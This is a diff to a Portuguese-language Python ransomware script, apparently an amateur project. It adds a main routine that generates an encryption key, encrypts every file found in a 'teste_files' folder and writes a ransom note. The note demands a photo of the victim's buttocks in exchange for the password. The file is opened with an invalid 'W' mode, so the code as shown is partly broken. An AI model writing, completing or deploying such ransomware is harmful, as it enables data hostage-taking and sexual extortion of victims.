@@ -35,4 +35,20 @@ def encontrar_arquivo(diretorio):
 
 def criar_mensagem_resgate():
     with open("LEIAS ISSO.txt", "W") as f:
-        f.write("Se fudeo")
+        f.write("Se fudeo\n")
+        f.write("Envia a foto da bunda\n")
+        f.write("Depois disso vc recebe a senha")
+
+# 6 Exectando
+
+def Main():
+    gerar_chave()
+    chave = carregar_chave()
+    arquivos = encontrar_arquivo('teste_files')
+    for arquivo in arquivos:
+        criptografar_arquivo(arquivo, chave)
+    criar_mensagem_resgate()
+    print("GIROMBADA ATOMICA")
+    print("VIRUZ EXECUTADO ")
+
+if __name__ == '__main__': Main()
